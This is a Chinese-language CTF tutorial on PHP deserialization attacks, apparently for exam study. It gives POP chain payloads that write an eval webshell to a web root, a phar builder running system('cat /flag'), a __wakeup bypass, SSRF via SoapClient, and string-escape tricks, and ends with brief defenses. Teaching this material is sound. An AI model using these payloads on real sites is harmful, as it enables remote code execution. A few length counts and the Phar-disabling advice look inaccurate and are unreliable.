# PHP 反序列化 + POP Chain 构造深度实战

> **📘 文档定位**：CISP 考试 CTF 安全 高级 | 难度：⭐⭐⭐⭐⭐ | 预计阅读：30 分钟
>
> PHP 反序列化深度实战，覆盖 POP Chain 自动化构造、thinkphp/laravel 等框架反序列化链分析及 CTF 真题解析。

---

## 导航目录

- [一、反序列化基础回顾](#一反序列化基础回顾)
- [二、POP Chain 自动化](#二pop-chain-自动化)
- [三、框架反序列化链](#三框架反序列化链)
- [四、CTF 真题解析](#四ctf-真题解析)
- [五、安全部署 Checklist](#五安全部署-checklist)
- [六、高分考点与知识巧记](#六高分考点与知识巧记)

---

## 📋 目录

1. [PHP序列化基础](#一php序列化基础)
2. [所有魔术方法](#二魔术方法)
3. [POP Chain 构造](#三pop-chain)
4. [CTF 常见考法](#四ctf考法)
5. [Phar 反序列化](#五phar反序列化)
6. [原生类利用](#六原生类利用)
7. [字符逃逸攻击](#七字符逃逸)
8. [绕过技巧大全](#八绕过技巧)
9. [完整案例：三道CTF真题](#九完整案例)
10. [防御方案](#十防御)

---

## 一、PHP 序列化基础

### 1.1 序列化格式

```php
// PHP 序列化字符串格式:
// 字符串: s:长度:"内容";
// 整数:   i:值;
// 布尔:   b:0或1;
// NULL:   N;
// 数组: a:长度:{...}
// 对象: O:类名长度:"类名":属性数:{...}

// 示例:
class User {
    public $name = "admin";
    protected $role = "user";   // \0*\0role
    private $token = "abc123";  // \0User\0token
}

$u = new User();
echo serialize($u);
// O:4:"User":3:{s:4:"name";s:5:"admin";s:7:"*role";s:4:"user";s:11:"Usertoken";s:6:"abc123";}

// 注意: 不可见字符 \0 在序列化中不可见, 但实际占字节!
// protected → \0*\0 → 3额外字节 (s:7:"\0*\0role")
// private   → \0类名\0 → 额外字节
```

### 1.2 属性类型对比

```php
<?php
class Demo {
    public $a;      // 序列化: s:1:"a"
    protected $b;   // 序列化: s:4:"\0*\0b" (前后各加\0*)
    private $c;     // 序列化: s:7:"\0Demo\0c" (前后各加\0类名)
}
$d = new Demo();
$d->a = "public";
$d->b = "protected";
$d->c = "private";
echo urlencode(serialize($d));
// O:4:"Demo":3:{s:1:"a";s:6:"public";s:4:"%00*%00b";s:9:"protected";s:7:"%00Demo%00c";s:7:"private";}
// 注意: %00 = \0 的URL编码
```

---

## 二、魔术方法

### 2.1 完整清单

```php
__construct()     // 构造函数, 实例化时调用 (new)
__destruct()      // ★ 析构函数, 销毁时调用 ← 最常见入口!
__wakeup()        // ★ unserialize() 后调用 ← 第二个最常见入口!
__sleep()         // serialize() 前调用
__toString()      // ★ 当对象被当作字符串时 ← 常见跳板!
__call($name,$args)  // 调用不存在的方法时
__callStatic()    // 调用不存在的静态方法时
__get($name)      // ★ 读取不可访问属性时 ← 常见跳板!
__set($name,$val) // 写入不可访问属性时
__isset($name)    // isset() 或 empty() 触发
__unset($name)    // unset() 触发
__invoke()        // 对象被当作函数调用时 ($obj())
__clone()         // clone 对象时
__debugInfo()     // var_dump() 触发
```

### 2.2 各方法在CTF中的作用

```php
// __destruct — 最常见入口
class Entry {
    public $obj;
    public function __destruct() {
        $this->obj->action();  // → 跟踪: 哪个类的 action() 有危险操作?
    }
}

// __wakeup — 第二个常见入口
class WakeupEntry {
    public $path;
    public function __wakeup() {
        include($this->path);  // → 文件包含!
    }
}

// __toString — 常见跳板
class ToStringJump {
    public $cmd;
    public function __toString() {
        return $this->cmd;  // 如果后续被 eval/preg_replace → RCE
        // 或: eval($this->cmd);  → 直接RCE!
    }
}

// __get — 常见跳板
class GetJump {
    public function __get($name) {
        return system($name);  // → RCE!
    }
}
```

---

## 三、POP Chain

### 3.1 完整案例

```php
<?php
// 题目源码
class FileManager {
    public $filename;
    public function __destruct() {
        $this->cleanup($this->filename);
    }
    public function cleanup($name) {
        // 输出文件内容
        echo file_get_contents($name);
    }
}

// Payload: O:11:"FileManager":1:{s:8:"filename";s:5:"/flag";}
// → 反序列化 → __destruct → cleanup('/flag') → echo file_get_contents('/flag')
```

### 3.2 复杂 POP Chain

```php
<?php
// 题目源码 — 需要多跳
class Register {
    public $obj;
    public function __destruct() {
        echo "Welcome, " . $this->obj;  // 触发 __toString
    }
}

class Logger {
    public $log_file;
    public $log_content;
    public function __toString() {
        file_put_contents($this->log_file, $this->log_content, FILE_APPEND);
        return "logged";
    }
}

// POP链: Register → __destruct → echo $obj → Logger::__toString → 写文件

// Payload:
$r = new Register();
$l = new Logger();
$l->log_file = "/var/www/html/shell.php";
$l->log_content = '<?php @eval($_POST["cmd"]);?>';
$r->obj = $l;
echo serialize($r);

// O:8:"Register":1:{s:3:"obj";O:6:"Logger":2:{s:8:"log_file";s:27:"/var/www/html/shell.php";s:11:"log_content";s:30:"<?php @eval($_POST["cmd"]);?>";}}
```

### 3.3 追踪技巧

```
POP Chain 追踪三步法:

Step 1: 搜索入口
  grep -rn "__destruct\|__wakeup" *.php
  → 找到所有可能的入口方法
  → 查看其中调用了什么 → 有危险操作(include/eval/file_get_contents)吗?

Step 2: 如果有 → 直接利用
Step 3: 如果没有 → 找跳板(__toString/__get/__call)
  → 看跳板方法中调用了什么 → 继续追踪
  → 直到找到危险操作

危险操作清单:
  eval/assert                → RCE
  system/exec/shell_exec    → 命令执行
  include/require           → 文件包含
  file_get_contents         → 文件读取
  file_put_contents         → 文件写入
  call_user_func            → 任意函数调用
  mysqli_query(无预处理)     → SQL注入
```

---

## 四、CTF 考法

### 4.1 基础反序列化

```php
// 题目:
$data = $_GET['data'];
$obj = unserialize($data);
echo $obj->name;

// Payload 构造:
class Test {
    public $name = "flag from /flag";
}
echo serialize(new Test());
// 发送: ?data=O:4:"Test":1:{s:4:"name";s:16:"flag from /flag";}
```

### 4.2 绕过 __wakeup

```php
// 当属性数量 > 实际属性数量 → __wakeup 被跳过!

// 原 Payload: 属性数为3
O:4:"Demo":3:{s:1:"a";s:1:"1";s:1:"b";s:1:"2";s:1:"c";s:1:"3";}

// 修改属性数为4(或更大):
O:4:"Demo":4:{s:1:"a";s:1:"1";s:1:"b";s:1:"2";s:1:"c";s:1:"3";}
// → __wakeup 被跳过, __destruct 仍然执行!

// 生效条件: PHP < 5.6.25 或 PHP < 7.0.10
// 高版本中仍可作为尝试(沙盒环境中可能有旧版本)
```

### 4.3 利用 CVE-2016-7124

```php
// 具体利用:
// 原始: O:4:"Test":1:{s:4:"data";s:8:"original";}
// 修改属性数2 > 实际1:
// O:4:"Test":2:{s:4:"data";s:8:"original";}
// → wakeup 被跳过
```

---

## 五、Phar 反序列化

### 5.1 原理

```
Phar 文件结构:
  ┌──────────────┐
  │  Stub (代码)  │  ← PHP代码(可执行)
  ├──────────────┤
  │  Manifest    │  ← 包含序列化的Meta-data!
  ├──────────────┤
  │  File Contents│ ← 文件内容
  ├──────────────┤
  │  Signature   │  ← 签名
  └──────────────┘

关键: phar:// 协议解析时 → 自动反序列化 Manifest 中的 Meta-data!
→ 不需要显式调用 unserialize()!
→ 几乎所有文件操作函数都会触发!
```

### 5.2 触发条件

```php
// 以下所有函数在操作 phar:// 协议时 → 触发反序列化:
file_exists('phar://uploads/test.jpg');
is_dir('phar://uploads/test.jpg');
file_get_contents('phar://uploads/test.jpg');
fopen('phar://uploads/test.jpg', 'r');
include('phar://uploads/test.jpg');
file('phar://uploads/test.jpg');
// ... 几乎所有文件系统函数!

// 不需要 serialize/unserialize!
// 只要代码中有文件操作 + 用户可控的文件路径 → 可能触发!
```

### 5.3 构造 Phar 文件

```php
<?php
// 生成恶意 Phar 文件
class Exploit {
    public function __destruct() {
        system('cat /flag');
    }
}

$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

// 设置 Meta-data → 自动序列化 → 反序列化时触发
$o = new Exploit();
$phar->setMetadata($o);

$phar->stopBuffering();

// 现在 exploit.phar 已生成
// 重命名为 .jpg 上传
// 访问: ?file=phar://uploads/avatar.jpg
// → 触发 Exploit::__destruct → system('cat /flag')
```

---

## 六、原生类利用

### 6.1 PHP 内置类

```php
// 当题目中没有自定义类时, 利用 PHP 原生类!

// 1. Error/Exception 类 — 读取文件
// PHP 7+ Error 类:
echo serialize(new Error("<script>alert(1)</script>", 0, 0, "/flag", 0));
// → 可以通过 __toString 泄露文件内容

// 2. SoapClient — SSRF
$c = new SoapClient(null, array(
    'uri' => 'http://127.0.0.1:8080/',
    'location' => 'http://127.0.0.1:8080/test'
));
echo urlencode(serialize($c));

// 3. SimpleXMLElement — XXE
// 构造 SimpleXMLElement 对象 → 触发 XXE

// 4. DirectoryIterator — 遍历目录
$d = new DirectoryIterator("/var/www/");
foreach ($d as $f) {
    echo $f->getFilename() . "\n";
}
```

### 6.2 Error 类读取文件

```php
<?php
// 利用 PHP Error 类的 __toString 读取文件
$e = new Error("payload", 0, 0, "/flag");
echo serialize($e);
// O:5:"Error":7:{s:10:"*message";s:7:"payload";...s:4:"file";s:5:"/flag";...}

// 当 $e 被当作字符串(如 echo/strval)时
// → Error::__toString → 包含 file 路径的内容
// → 在错误信息中泄露文件内容
```

---

## 七、字符逃逸

### 7.1 过滤导致变长

```php
<?php
// 场景: 过滤函数造成字符串变长 → 利用差值逃逸

function filter($str) {
    return str_replace('x', 'yy', $str);  // 1字符 → 2字符
}

// 反序列化前先过滤:
$data = filter($_POST['data']);
$obj = unserialize($data);

// 利用:
// 要注入: s:2:"op";i:1; → 需逃逸出 10个字符
// 因为一个 x→yy 增加1个字符 → 需要10个 x
// Payload: xxxxxxxxxxs:2:"op";i:1;  (10个x + 要注入的部分)
```

### 7.2 实战逃逸 Payload

```php
<?php
// 题目:
function filter($str) {
    return str_replace('f', 'ff', $str);  // f→ff → 1→2字符
}

class A {
    public $a = 'guest';
    public $b = 'normal';
}
// 正常: O:1:"A":2:{s:1:"a";s:5:"guest";s:1:"b";s:6:"normal";}

// 要修改: $b = 'admin' (s:1:"b";s:5:"admin";)
// 需逃逸: ";s:1:"b";s:5:"admin";} (23字符)
// 需要23个 f → 每个f多1字符 → 逃逸23字符

$payload = str_repeat('f', 23) . '";s:1:"b";s:5:"admin";}';
// → 过滤后: ff...ff(46个f)";s:1:"b";s:5:"admin";}
// → 闭合后, 解析到 s:1:"a";s:46:"ff...ff"; 时
// → a的值包含了: ff...ff";s:1:"b";s:5:"admin";}
// → 实际被解析为: a=(46个f) + b=admin ✓
```

---

## 八、绕过技巧

```php
// 1. 私有属性保护 — 利用 \0 不可见
// 手动构造带 \0 的序列化字符串:
// s:7:"\0Demo\0data" → 7个字符: \0 D e m o \0 d a t a
// 传参时必须 URL 编码: %00Demo%00data

// 2. 数字型绕过 — S: 支持16进制
// s:5:"hello" → S:5:"\68\65\6c\6c\6f"

// 3. 引用 — R: 引用其他属性
// O:1:"A":2:{s:1:"a";s:4:"test";s:1:"b";R:2;}
// b 引用 a → b 和 a 相同

// 4. 序列化中的 C: — 自定义序列化
// C:类名长度:"类名":数据长度:{数据}

// 5. fast\_destruct — 强制提前析构
// Payload: a:2:{i:0;O:1:"A":0:{}i:1;O:1:"B":0:{}}
// → 修改属性数量 > 实际 → 提前触发 __destruct
```

---

## 九、完整案例

### 案例1: 简单魔术方法

```
题目: 一个简单的上传系统

源码:
class File {
    public $filename;
    public function __destruct() {
        if (file_exists($this->filename)) {
            echo file_get_contents($this->filename);
        }
    }
}
$data = unserialize($_GET['data']);

利用:
  Payload: O:4:"File":1:{s:8:"filename";s:5:"/flag";}
  ?data=O:4:"File":1:{s:8:"filename";s:5:"/flag";}
  → __destruct → file_exists('/flag') → true → echo /flag
  
Flag: flag{PHP_unser1alize_1s_danger0us}
```

### 案例2: Phar 反序列化

```
题目: 头像上传功能, 可上传 .jpg, 且有 file_exists 检查

源码:
$path = 'uploads/' . $_GET['file'];
if (file_exists($path)) {  // ← 触发 Phar!
    header('Content-Type: image/jpeg');
    readfile($path);
}

利用:
  ① 构造恶意 Phar (见第五节)
  ② 重命名为 avatar.jpg
  ③ 上传 → /uploads/avatar.jpg
  ④ ?file=phar://uploads/avatar.jpg
  → file_exists → Phar反序列化 → RCE
```

### 案例3: POP Chain 多跳

```
题目: 某CMS反序列化漏洞

源码:
class Cache {
    public $adapter;
    public function __destruct() {
        $this->adapter->save();     // → 找有 save() 方法的类
    }
}

class FileAdapter {
    public $path;
    public $data;
    public function save() {
        file_put_contents($this->path, $this->data);  // → 终点!
    }
}

利用:
  $c = new Cache();
  $f = new FileAdapter();
  $f->path = '/var/www/html/shell.php';
  $f->data = '<?php @eval($_POST[1]);?>';
  $c->adapter = $f;
  echo serialize($c);
```

---

## 十、防御

```php
// 1. 不要反序列化用户输入! (根本解决)
// 使用 JSON 替代: json_decode($data, false); // 返回 stdClass

// 2. 如果必须反序列化:
// 使用 allowed_classes 限制:
unserialize($data, ['allowed_classes' => ['SafeClass']]); // PHP 7.0+

// 3. HMAC 签名验证
$hash = hash_hmac('sha256', $data, $secret_key);
if ($hash !== $_GET['hash']) die('Invalid signature');

// 4. 禁用 Phar 协议(如不需要)
// php.ini: disable_functions = Phar::...
```

---

## ✅ Checklist

- [ ] 搜索所有 `__destruct` / `__wakeup`
- [ ] 跟踪每个魔术方法 → 找危险操作
- [ ] 构造 POP Chain
- [ ] 测试 Phar 反序列化
- [ ] 尝试原生类利用
- [ ] 测试字符逃逸
- [ ] `__wakeup` 绕过
